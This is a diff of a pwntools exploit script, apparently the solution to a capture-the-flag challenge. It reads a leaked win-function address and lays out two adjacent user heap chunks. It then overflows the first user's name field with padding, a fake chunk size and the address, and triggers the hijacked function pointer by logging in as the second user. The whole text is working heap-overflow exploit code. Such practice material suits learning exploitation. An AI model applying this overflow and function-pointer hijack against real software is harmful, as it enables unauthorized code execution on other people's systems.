@@ -48,8 +48,55 @@ io = start()
 # flag = io.recv(...)
 # log.success(flag)
 
-io.recvuntil(b">")
+# receive address of the win function
+io.recvuntil(b"0x")
+add = int(io.recvline()[:-1], 16)
+
+# buffer overflow + chunk size data + desired return address
+payload = b"A" * 20 + p64(0x31) + p64(add)
+
+# Log out of root/original user
+io.recvuntil(b"Exit")
 io.sendline(b"3")
+
+# create two new users immediately after another such that their chunks are stored adjacently
+io.recvuntil(b"Exit")
+io.sendline(b"2")
+
+io.recvuntil(b"name")
+io.sendline(b"Junk")
+
+io.recvuntil(b"Exit")
+io.sendline(b"2")
+
+io.recvuntil(b"name")
+io.sendline(b"Junk2")
+
+# sign into the first user account
+io.recvuntil(b"Exit")
+io.sendline(b"1")
+
+io.recvuntil(b"ID")
+io.sendline(b"1")
+
+# change the name of the first user
+io.recvuntil(b"Exit")
+io.sendline(b"1")
+
+# exploit the buffer overflow to write data into second user chunk
+io.recvuntil(b"to")
+io.sendline(payload)
+
+# log out of original users account
+io.recvuntil(b"Exit")
+io.sendline(b"3")
+
+# sign into new user account to call changed function pointer
+io.recvuntil(b"Exit")
+io.sendline(b"1")
+
+io.recvuntil(b"ID")
+io.sendline(b"2")
 
 io.interactive()
 
